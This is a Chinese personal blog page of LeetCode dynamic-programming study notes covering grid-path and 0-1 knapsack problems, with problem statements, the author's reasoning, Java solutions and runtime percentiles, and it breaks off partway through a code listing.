<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] pathsWithMaxScore(List&lt;String&gt; board) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> board.size();</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][m];</span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="comment">//障碍</span></span><br><span class="line">            <span class="keyword">if</span> (board.get(<span class="number">0</span>).charAt(i) == <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">                dp[<span class="number">0</span>][i] = -<span class="number">1</span>;<span class="comment">//0表示分数</span></span><br><span class="line">                dp[<span class="number">1</span>][i] = <span class="number">0</span>;<span class="comment">//1表示方案数</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//之前就不通了</span></span><br><span class="line">            <span class="keyword">if</span> (dp[<span class="number">0</span>][i - <span class="number">1</span>] == -<span class="number">1</span>) &#123;</span><br><span class="line">                dp[<span class="number">0</span>][i] = -<span class="number">1</span>;<span class="comment">//值为-1表示走不通</span></span><br><span class="line">                dp[<span class="number">1</span>][i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//正常情况</span></span><br><span class="line">            dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][i - <span class="number">1</span>] + (<span class="type">int</span>) (board.get(<span class="number">0</span>).charAt(i) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            dp[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">prevNum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//max(dp[i-1][j],dp[i][j-1],dp[i-1][j-1]) 保存dp[i-1][j-1]</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">prevChoiceNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (board.get(i).charAt(j) == <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">                        prevNum = dp[<span class="number">0</span>][j];</span><br><span class="line">                        prevChoiceNum = dp[<span class="number">1</span>][j];</span><br><span class="line">                        dp[<span class="number">0</span>][j] = -<span class="number">1</span>;</span><br><span class="line">                        dp[<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        prevNum = dp[<span class="number">0</span>][j];</span><br><span class="line">                        prevChoiceNum = dp[<span class="number">1</span>][j];</span><br><span class="line">                        <span class="keyword">if</span> (dp[<span class="number">0</span>][j] == -<span class="number">1</span>) <span class="keyword">continue</span>;<span class="comment">//上行不通就无需改变状态</span></span><br><span class="line">                        dp[<span class="number">0</span>][j] += (<span class="type">int</span>) (board.get(i).charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == m - <span class="number">1</span> &amp;&amp; j == m - <span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">chance1</span> <span class="operator">=</span> dp[<span class="number">0</span>][j];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">chance2</span> <span class="operator">=</span> dp[<span class="number">0</span>][j - <span class="number">1</span>];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">chance3</span> <span class="operator">=</span> prevNum;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">maxScore</span> <span class="operator">=</span> Integer.max(Integer.max(chance1, chance2), chance3);</span><br><span class="line">                        <span class="comment">//三个方向都不通</span></span><br><span class="line">                        <span class="keyword">if</span> (maxScore == -<span class="number">1</span>) &#123;</span><br><span class="line">                            dp[<span class="number">0</span>][j] = -<span class="number">1</span>;</span><br><span class="line">                            dp[<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">tempNum</span> <span class="operator">=</span> dp[<span class="number">0</span>][j];</span><br><span class="line">                            <span class="type">int</span> <span class="variable">tempChoice</span> <span class="operator">=</span> dp[<span class="number">1</span>][j];</span><br><span class="line">                            dp[<span class="number">0</span>][j] = maxScore ;</span><br><span class="line">                            dp[<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">if</span> (maxScore == chance1) dp[<span class="number">1</span>][j] += tempChoice;</span><br><span class="line">                            dp[<span class="number">1</span>][j] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                            <span class="keyword">if</span> (maxScore == chance2) dp[<span class="number">1</span>][j] += dp[<span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                            dp[<span class="number">1</span>][j] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                            <span class="keyword">if</span> (maxScore == chance3) dp[<span class="number">1</span>][j] += prevChoiceNum;</span><br><span class="line">                            dp[<span class="number">1</span>][j] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                            prevNum = tempNum;</span><br><span class="line">                            prevChoiceNum = tempChoice;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;<span class="comment">//到结尾了</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(board.get(i).charAt(j) == <span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">                        prevNum = dp[<span class="number">0</span>][j];</span><br><span class="line">                        prevChoiceNum = dp[<span class="number">1</span>][j];</span><br><span class="line">                        dp[<span class="number">0</span>][j] = -<span class="number">1</span>;</span><br><span class="line">                        dp[<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">chance1</span> <span class="operator">=</span> dp[<span class="number">0</span>][j];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">chance2</span> <span class="operator">=</span> dp[<span class="number">0</span>][j - <span class="number">1</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">chance3</span> <span class="operator">=</span> prevNum;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">maxScore</span> <span class="operator">=</span> Integer.max(Integer.max(chance1, chance2), chance3);</span><br><span class="line">                    <span class="comment">//三个方向都不通</span></span><br><span class="line">                    <span class="keyword">if</span> (maxScore == -<span class="number">1</span>) &#123;</span><br><span class="line">                        dp[<span class="number">0</span>][j] = -<span class="number">1</span>;</span><br><span class="line">                        dp[<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">tempNum</span> <span class="operator">=</span> dp[<span class="number">0</span>][j];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">tempChoice</span> <span class="operator">=</span> dp[<span class="number">1</span>][j];</span><br><span class="line">                        dp[<span class="number">0</span>][j] = maxScore + (<span class="type">int</span>) (board.get(i).charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                        dp[<span class="number">1</span>][j] = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (maxScore == chance1) dp[<span class="number">1</span>][j] += tempChoice;</span><br><span class="line">                        dp[<span class="number">1</span>][j] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                        <span class="keyword">if</span> (maxScore == chance2) dp[<span class="number">1</span>][j] += dp[<span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                        dp[<span class="number">1</span>][j] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                        <span class="keyword">if</span> (maxScore == chance3) dp[<span class="number">1</span>][j] += prevChoiceNum;</span><br><span class="line">                        dp[<span class="number">1</span>][j] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                        prevNum = tempNum;</span><br><span class="line">                        prevChoiceNum = tempChoice;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[<span class="number">0</span>][m - <span class="number">1</span>] == -<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;dp[<span class="number">0</span>][m - <span class="number">1</span>], dp[<span class="number">1</span>][m - <span class="number">1</span>]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>思路简单，但是想要压空间还是麻烦。编码编了好久。。。。。。。。。。。。</p>
<p>时间：43.04%</p>
<p>内存：99.58%</p>
<p>我的题解</p>
<p><a href="https://leetcode.cn/problems/number-of-paths-with-max-score/">1301. 最大得分的路径数目 - 力扣（LeetCode）</a></p>
<h3 id="2435-矩阵中和能被-K-整除的路径"><a href="#2435-矩阵中和能被-K-整除的路径" class="headerlink" title="2435. 矩阵中和能被 K 整除的路径"></a><a href="https://leetcode.cn/problems/paths-in-matrix-whose-sum-is-divisible-by-k/">2435. 矩阵中和能被 K 整除的路径</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始的 m x n 整数矩阵 grid 和一个整数 k 。你从起点 (0, 0) 出发，每一步只能往 下 或者往 右 ，你想要到达终点 (m - 1, n - 1) 。</span><br><span class="line"></span><br><span class="line">请你返回路径和能被 k 整除的路径数目，由于答案可能很大，返回答案对 109 + 7 取余 的结果。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">困难题，有点害怕。</span><br><span class="line">直观感觉可以用两个队列做，但是这是dp专题。想想怎样定义dp数组吧</span><br><span class="line"></span><br><span class="line">根据套路，应该能够定义一个dp[m][n][k]数组。对于dp[i][j][z]表示坐标为(i,j)模k的路径</span><br><span class="line">因此有这样的转移公式</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            dp[i][j][(z+grid[i][j])%k] = dp[i-<span class="number">1</span>][j][z] +  dp[i][j-<span class="number">1</span>][(z+grid[i][j])%k]<span class="comment">#未考虑边界值</span></span><br><span class="line"> 然后发现空间能压缩成dp[n][k]</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfPaths</span><span class="params">(<span class="type">int</span>[][] grid, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n][k];</span><br><span class="line"></span><br><span class="line">        dp[<span class="number">0</span>][grid[<span class="number">0</span>][<span class="number">0</span>] % k] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> grid[<span class="number">0</span>][<span class="number">0</span>] % k;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            prev = (prev + grid[<span class="number">0</span>][i]) % k;</span><br><span class="line">            dp[i][prev] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="type">int</span>[] tempArr = dp[j].clone();</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">z</span> <span class="operator">=</span> <span class="number">0</span>; z &lt; k; z++) &#123;</span><br><span class="line">                        dp[j][(z + grid[i][j]) % k] = tempArr[z];</span><br><span class="line">                        dp[j][(z + grid[i][j]) % k] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">z</span> <span class="operator">=</span> <span class="number">0</span>; z &lt; k; z++) &#123;</span><br><span class="line">                        dp[j][(z + grid[i][j]) % k] = tempArr[z] + dp[j - <span class="number">1</span>][z];</span><br><span class="line">                        dp[j][(z + grid[i][j]) % k] %= (<span class="number">1000000000</span> + <span class="number">7</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时打败:53.96%</p>
<p>内存打败:66.91%</p>
<h3 id="329-矩阵中的最长递增路径"><a href="#329-矩阵中的最长递增路径" class="headerlink" title="329. 矩阵中的最长递增路径"></a><a href="https://leetcode.cn/problems/longest-increasing-path-in-a-matrix/">329. 矩阵中的最长递增路径</a></h3><p>todo有点难之后在做</p>
<h3 id="2328-网格图中递增路径的数目"><a href="#2328-网格图中递增路径的数目" class="headerlink" title="2328. 网格图中递增路径的数目"></a><a href="https://leetcode.cn/problems/number-of-increasing-paths-in-a-grid/">2328. 网格图中递增路径的数目</a></h3><p>todo</p>
<h3 id="2267-检查是否有合法括号字符串路径"><a href="#2267-检查是否有合法括号字符串路径" class="headerlink" title="2267. 检查是否有合法括号字符串路径"></a><a href="https://leetcode.cn/problems/check-if-there-is-a-valid-parentheses-string-path/">2267. 检查是否有合法括号字符串路径</a></h3><p>todo</p>
<h3 id="1937-扣分后的最大得分"><a href="#1937-扣分后的最大得分" class="headerlink" title="1937. 扣分后的最大得分"></a><a href="https://leetcode.cn/problems/maximum-number-of-points-with-cost/">1937. 扣分后的最大得分</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网格图dp</span><br><span class="line">直接三个循环秒了，可以压缩空间为二维滚动数组</span><br></pre></td></tr></table></figure>

<p>代码（超时了，得优化）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public long maxPoints(int[][] points) &#123;</span><br><span class="line">        int m = points.length;</span><br><span class="line">        int n = points[0].length;</span><br><span class="line">        long[][] dp = new long[2][n];</span><br><span class="line">        for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="line">            dp[0][i] = points[0][i];</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i = 1; i &lt; m; i++) &#123;</span><br><span class="line">            for (int j = 0; j &lt; n; j++) &#123;</span><br><span class="line">                for (int k = 0; k &lt; n; k++) &#123;</span><br><span class="line">                    dp[i % 2][j] = Long.max(dp[i % 2][j], dp[(i + 1) % 2][k] - Math.abs(k - j));</span><br><span class="line">                &#125;</span><br><span class="line">                dp[i % 2][j] += points[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            Arrays.fill(dp[(i + 1) % 2], 0);</span><br><span class="line">        &#125;</span><br><span class="line">        return Arrays.stream(dp[(m - 1) % 2]).max().getAsLong();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正确代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">j′&lt;=j</span><br><span class="line">f[i][j]=max&#123;f[i−1][j′]−j+j′&#125;+points[i][j]</span><br><span class="line">=max&#123;f[i−1][j′]+j′&#125;+points[i][j]−j</span><br><span class="line"></span><br><span class="line">j&#x27;&gt;j</span><br><span class="line"></span><br><span class="line">f[i][j]=max&#123;f[i−1][j′]+j-j′&#125;+points[i][j]</span><br><span class="line">=max&#123;f[i−1][j′]-j′&#125;+points[i][j]+j</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maxPoints</span><span class="params">(<span class="type">int</span>[][] points)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> points.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> points[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">long</span>[][] dp = <span class="keyword">new</span> <span class="title class_">long</span>[<span class="number">2</span>][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = points[<span class="number">0</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">maxVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                maxVal = Long.max(dp[(i + <span class="number">1</span>) % <span class="number">2</span>][j] + j, maxVal);</span><br><span class="line">                dp[i % <span class="number">2</span>][j] = maxVal + points[i][j] - j;</span><br><span class="line">            &#125;</span><br><span class="line">            maxVal = Long.MIN_VALUE;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                maxVal = Long.max(dp[(i + <span class="number">1</span>) % <span class="number">2</span>][j] - j, maxVal);</span><br><span class="line">                dp[i % <span class="number">2</span>][j] = Long.max(dp[i % <span class="number">2</span>][j], points[i][j] + j + maxVal);</span><br><span class="line">            &#125;</span><br><span class="line">            Arrays.fill(dp[(i + <span class="number">1</span>) % <span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.stream(dp[(m - <span class="number">1</span>) % <span class="number">2</span>]).max().getAsLong();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>感觉超时版本为中等难度，优化版本为困难难度。</p>
<h3 id="1463-摘樱桃-II"><a href="#1463-摘樱桃-II" class="headerlink" title="1463. 摘樱桃 II"></a><a href="https://leetcode.cn/problems/cherry-pickup-ii/">1463. 摘樱桃 II</a></h3><p>todo</p>
<h3 id="1463-摘樱桃-II-1"><a href="#1463-摘樱桃-II-1" class="headerlink" title="1463. 摘樱桃 II"></a><a href="https://leetcode.cn/problems/cherry-pickup-ii/">1463. 摘樱桃 II</a></h3><p>todo</p>
<h2 id="背包"><a href="#背包" class="headerlink" title="背包"></a>背包</h2><h3 id="2915-和为目标值的最长子序列的长度"><a href="#2915-和为目标值的最长子序列的长度" class="headerlink" title="2915. 和为目标值的最长子序列的长度"></a><a href="https://leetcode.cn/problems/length-of-the-longest-subsequence-that-sums-to-target/">2915. 和为目标值的最长子序列的长度</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始的整数数组 nums 和一个整数 target 。</span><br><span class="line"></span><br><span class="line">返回和为 target 的 nums 子序列中，子序列 长度的最大值 。如果不存在和为 target 的子序列，返回 -1 。</span><br><span class="line"></span><br><span class="line">子序列 指的是从原数组中删除一些或者不删除任何元素后，剩余元素保持原来的顺序构成的数组。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先肯定是动态规划。</span><br><span class="line">然后既然这题放在背包里面。</span><br><span class="line">那肯定是0-1背包。然后就是标准写法了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubsequence</span><span class="params">(List&lt;Integer&gt; nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[target + <span class="number">1</span>];</span><br><span class="line">        Arrays.fill(dp, Integer.MIN_VALUE);</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            sum += num;</span><br><span class="line">            sum = Integer.min(target, sum);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> sum; j &gt;= num; j--) &#123;</span><br><span class="line">                dp[j] = Integer.max(dp[j], dp[j - num] == Integer.MIN_VALUE ? Integer.MIN_VALUE : (dp[j - num] + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] == Integer.MIN_VALUE ? -<span class="number">1</span> : dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>时间：85.71%</p>
<p>空间：83.35%</p>
<h3 id="2787-将一个数字表示成幂的和的方案数"><a href="#2787-将一个数字表示成幂的和的方案数" class="headerlink" title="2787. 将一个数字表示成幂的和的方案数"></a><a href="https://leetcode.cn/problems/ways-to-express-an-integer-as-sum-of-powers/">2787. 将一个数字表示成幂的和的方案数</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你两个 正 整数 n 和 x 。</span><br><span class="line"></span><br><span class="line">请你返回将 n 表示成一些 互不相同 正整数的 x 次幂之和的方案数。换句话说，你需要返回互不相同整数 [n1, n2, ..., nk] 的集合数目，满足 n = n1x + n2x + ... + nkx 。</span><br><span class="line"></span><br><span class="line">由于答案可能非常大，请你将它对 109 + 7 取余后返回。</span><br><span class="line"></span><br><span class="line">比方说，n = 160 且 x = 3 ，一个表示 n 的方法是 n = 23 + 33 + 53 。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">动归肯定是（需要模数，且是在动归题单）</span><br><span class="line"></span><br><span class="line">思路把n看成背包容量,n**x看成物品。就是常规0-1背包了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfWays</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD</span> <span class="operator">=</span> (<span class="type">int</span>)<span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INT_MIN</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//dp[i][j] = dp[i-1][j] + d[i-1][j - weight]</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; (<span class="type">int</span>) (Math.pow(i, x)) &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">weight</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.pow(i, x));</span><br><span class="line">            sum += weight;</span><br><span class="line">            sum = Integer.min(sum, n);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> sum;j&gt;=weight;j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(dp[j-weight]!=INT_MIN)&#123;</span><br><span class="line">                    dp[j] = dp[j-weight] + dp[j];</span><br><span class="line">                &#125;</span><br><span class="line">                dp[j] %= MOD;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说下一个注意点，易得递推公式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp[i][j] = dp[i-1][j] + d[i-1][j - weight]</span><br></pre></td></tr></table></figure>

<p>这里可以看到一个点的状态只跟其，左上角，和上面有关。因此要空间压缩的话我们需要从大到小遍历，避免状态更新到当前行影响结果。</p>
<p>时间：92.01%</p>
<p>空间：85.96%</p>
<h3 id="3180-执行操作可获得的最大总奖励-I"><a href="#3180-执行操作可获得的最大总奖励-I" class="headerlink" title="3180. 执行操作可获得的最大总奖励 I"></a><a href="https://leetcode.cn/problems/maximum-total-reward-using-operations-i/">3180. 执行操作可获得的最大总奖励 I</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个整数数组 rewardValues，长度为 n，代表奖励的值。</span><br><span class="line"></span><br><span class="line">最初，你的总奖励 x 为 0，所有下标都是 未标记 的。你可以执行以下操作 任意次 ：</span><br><span class="line"></span><br><span class="line">从区间 [0, n - 1] 中选择一个 未标记 的下标 i。</span><br><span class="line">如果 rewardValues[i] 大于 你当前的总奖励 x，则将 rewardValues[i] 加到 x 上（即 x = x + rewardValues[i]），并 标记 下标 i。</span><br><span class="line">以整数形式返回执行最优操作能够获得的 最大 总奖励。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉有点像旅行商问题啊。</span><br><span class="line">肯定需要先排序。然后想想下步干嘛</span><br><span class="line">然后看范围</span><br><span class="line">1 &lt;= rewardValues.length &lt;= 2000</span><br><span class="line">1 &lt;= rewardValues[i] &lt;= 2000</span><br><span class="line">我们可以肯定的说，最大奖励一定不会超过 2*max(rewardValues)。</span><br><span class="line">这个很好证明, a1+a2 + .... an =(a1+..... an-1) + an &lt; 2an</span><br><span class="line">然后直接dp启动</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxTotalReward</span><span class="params">(<span class="type">int</span>[] rewardValues)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> rewardValues.length;</span><br><span class="line">        Arrays.sort(rewardValues);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ARR_MAX_VAL</span> <span class="operator">=</span> rewardValues[n - <span class="number">1</span>];</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">2</span> * ARR_MAX_VAL];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : rewardValues) &#123;</span><br><span class="line">            sum += num;</span><br><span class="line">            sum = Integer.min(sum, <span class="number">2</span> * ARR_MAX_VAL);</span><br><span class="line">            <span class="comment">//num &gt; j -num</span></span><br><span class="line">            <span class="comment">// 2 * num &gt; j</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span 